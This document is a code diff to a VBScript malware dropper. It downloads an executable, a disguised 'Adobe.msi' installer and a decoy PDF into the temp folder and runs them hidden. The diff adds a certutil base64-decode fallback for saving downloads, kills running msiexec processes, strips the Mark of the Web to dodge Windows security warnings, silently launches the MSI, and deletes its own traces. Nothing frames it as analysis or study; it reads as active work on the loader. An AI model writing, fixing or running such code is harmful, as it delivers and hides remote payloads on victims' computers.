@@ -1,6 +1,7 @@
 Dim fso, sh, qs, selfPath, isAdmin, http, stream, dbg
 Dim icuUrl, msiUrl, pdfUrl
 Dim tmpExe, msiPath, pdfPath, logFile
+Dim wmi, msiKill, msiKillEntry
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
@@ -78,28 +79,31 @@ If Not isAdmin Then
             icuSaved = True
             dbg.WriteLine "[ICU] saved: " & fso.GetFile(tmpExe).Size & " bytes"
         Else
-            dbg.WriteLine "[ICU] direct save FAILED - VBS fallback"
-            Dim xmlDoc, binNode, byteArray
+            dbg.WriteLine "[ICU] direct save FAILED - certutil fallback"
+            Dim icuB64Path, icuB64Text, icuFh, icuXml, icuNode
+            icuB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64"
             On Error Resume Next
-            Set xmlDoc = CreateObject("MSXML2.DOMDocument")
-            Set binNode = xmlDoc.createElement("b")
-            binNode.dataType = "bin:base64"
-            binNode.nodeTypedValue = http.ResponseBody
-            If Err.Number = 0 Then
-                byteArray = binNode.nodeTypedValue
-                Dim st
-                Set st = CreateObject("ADODB.Stream")
-                st.Type = 1
-                st.Open
-                st.Write byteArray
-                st.SaveToFile tmpExe, 2
-                st.Close
-            End If
+            Set icuXml = CreateObject("MSXML2.DOMDocument")
+            Set icuNode = icuXml.createElement("b")
+            icuNode.dataType = "bin:base64"
+            icuNode.nodeTypedValue = http.ResponseBody
+            icuB64Text = icuNode.text
             Err.Clear
             On Error GoTo 0
-            If fso.FileExists(tmpExe) Then 
-                icuSaved = True
-                dbg.WriteLine "[ICU] VBS fallback saved: " & fso.GetFile(tmpExe).Size & " bytes"
+
+            If icuB64Text <> "" Then
+                Set icuFh = fso.CreateTextFile(icuB64Path, True)
+                icuFh.Write icuB64Text
+                icuFh.Close
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & icuB64Path & """ """ & tmpExe & """", 0, True
+                If fso.FileExists(tmpExe) Then 
+                    icuSaved = True
+                    dbg.WriteLine "[ICU] certutil OK: " & fso.GetFile(tmpExe).Size & " bytes"
+                End If
+                On Error Resume Next
+                fso.DeleteFile icuB64Path, True
+                Err.Clear
+                On Error GoTo 0
             End If
         End If
 
@@ -123,7 +127,6 @@ If Not isAdmin Then
                 On Error GoTo 0
                 dbg.WriteLine "[BAT] short path: " & shortBat
 
-                dbg.WriteLine "[ICU] running: " & qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs
                 sh.Run qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs, 0, False
                 sh.Run "%COMSPEC% /c timeout /t 20 /nobreak >nul & del /f /q """ & batPath & """", 0, False
             End If
@@ -137,10 +140,23 @@ If Not isAdmin Then
 ' ============================================================
 Else
     dbg.WriteLine "[BRANCH] ADMIN - proceeding with payload"
+    
+    ' --- KILL ZOMBIE MSIEXEC ---
+    dbg.WriteLine "[MSI] Killing zombie msiexec..."
+    On Error Resume Next
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set msiKill = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
+    For Each msiKillEntry In msiKill
+        msiKillEntry.Terminate
+    Next
+    Err.Clear
+    On Error GoTo 0
+
     tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     On Error Resume Next
     If fso.FileExists(tmpExe) Then fso.DeleteFile tmpExe, True
     If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
+    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64") Then fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64", True
     Err.Clear
     On Error GoTo 0
 
@@ -174,7 +190,6 @@ Else
         Else
             dbg.WriteLine "[PDF] direct save FAILED - VBS fallback"
             Dim pXml, pNode
-            On Error Resume Next
             Set pXml = CreateObject("MSXML2.DOMDocument")
             Set pNode = pXml.createElement("b")
             pNode.dataType = "bin:base64"
@@ -185,8 +200,6 @@ Else
             stream.Write pNode.nodeTypedValue
             stream.SaveToFile pdfPath, 2
             stream.Close
-            Err.Clear
-            On Error GoTo 0
             If fso.FileExists(pdfPath) Then pdfSaved = True
         End If
 
@@ -197,42 +210,95 @@ Else
     End If
 
     ' --- MSI ---
-    dbg.WriteLine "[MSI] starting download via bitsadmin..."
+    dbg.WriteLine "[MSI] starting"
     msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
-    
     On Error Resume Next
     If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", msiUrl, False
+    http.Send
     Err.Clear
     On Error GoTo 0
+    dbg.WriteLine "[MSI] status: " & http.Status
 
-    ' Use bitsadmin to bypass the 3716 ADODB.Stream restriction
-    Dim bitsCmd, bitsJob
-    bitsJob = "AdobeJob_" & Replace(CStr(Timer), ".", "")
-    bitsCmd = "bitsadmin /transfer " & bitsJob & " /priority foreground " & qs & msiUrl & qs & " " & qs & msiPath & qs
-    dbg.WriteLine "[MSI] bits cmd: " & bitsCmd
-    sh.Run "%COMSPEC% /c " & bitsCmd, 0, True
-    
-    If fso.FileExists(msiPath) Then
-        dbg.WriteLine "[MSI] bitsadmin saved: " & fso.GetFile(msiPath).Size & " bytes"
-        
-        ' Strip Mark of the Web just in case
+    If http.Status = 200 Then
+        Dim msiSaved
+        msiSaved = False
+
         On Error Resume Next
-        Dim adsFile
-        adsFile = msiPath & ":Zone.Identifier"
-        If fso.FileExists(adsFile) Then fso.DeleteFile adsFile, True
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile msiPath, 2
+        If Err.Number <> 0 Then dbg.WriteLine "[MSI] direct save err: " & Err.Number
         Err.Clear
+        stream.Close
         On Error GoTo 0
 
-        ' Launch via WMIC (Clean syntax)
-        Dim wmicCmd
-        wmicCmd = "wmic process call create " & qs & "msiexec.exe /i """ & msiPath & """ /qn /norestart" & qs
-        dbg.WriteLine "[MSI] wmic cmd: " & wmicCmd
-        sh.Run "%COMSPEC% /c " & wmicCmd, 0, False
-        
-        ' Cleanup MSI
-        sh.Run "%COMSPEC% /c timeout /t 90 /nobreak >nul & del /f /q """ & msiPath & """", 0, False
-    Else
-        dbg.WriteLine "[MSI] bitsadmin FAILED to download"
+        If fso.FileExists(msiPath) Then
+            msiSaved = True
+            dbg.WriteLine "[MSI] saved: " & fso.GetFile(msiPath).Size & " bytes"
+        Else
+            ' --- THE EXACT FIX FOR 3716 ---
+            dbg.WriteLine "[MSI] direct save FAILED - certutil fallback"
+            Dim mXml, mNode, b64Text, fh, b64Path
+            b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+            
+            On Error Resume Next
+            Set mXml = CreateObject("MSXML2.DOMDocument")
+            Set mNode = mXml.createElement("b")
+            mNode.dataType = "bin:base64"
+            mNode.nodeTypedValue = http.ResponseBody
+            b64Text = mNode.text
+            Err.Clear
+            On Error GoTo 0
+            
+            If b64Text <> "" Then
+                Set fh = fso.CreateTextFile(b64Path, True)
+                fh.Write b64Text
+                fh.Close
+                dbg.WriteLine "[MSI] wrote b64 file, size: " & Len(b64Text)
+                
+                ' Use certutil to decode the file on disk
+                dbg.WriteLine "[MSI] running certutil decode..."
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
+                
+                If fso.FileExists(msiPath) Then 
+                    msiSaved = True
+                    dbg.WriteLine "[MSI] certutil saved: " & fso.GetFile(msiPath).Size & " bytes"
+                Else
+                    dbg.WriteLine "[MSI] certutil FAILED to decode"
+                End If
+                
+                On Error Resume Next
+                fso.DeleteFile b64Path, True
+                Err.Clear
+                On Error GoTo 0
+            Else
+                dbg.WriteLine "[MSI] b64 conversion failed"
+            End If
+        End If
+
+        If msiSaved Then
+            ' 1. Strip the Mark of the Web
+            On Error Resume Next
+            Dim adsFile
+            adsFile = msiPath & ":Zone.Identifier"
+            If fso.FileExists(adsFile) Then 
+                fso.DeleteFile adsFile, True
+                dbg.WriteLine "[MSI] Zone.Identifier stripped"
+            End If
+            Err.Clear
+            On Error GoTo 0
+
+            ' 2. Launch via shell association (works on Win10, tested before)
+            dbg.WriteLine "[MSI] launching via shell association"
+            sh.Run Chr(34) & msiPath & Chr(34), 0, False
+            
+            ' 3. Cleanup
+            sh.Run "%COMSPEC% /c timeout /t 90 /nobreak >nul & del /f /q """ & msiPath & """", 0, False
+        End If
     End If
 
     ' --- CLEANUP ---
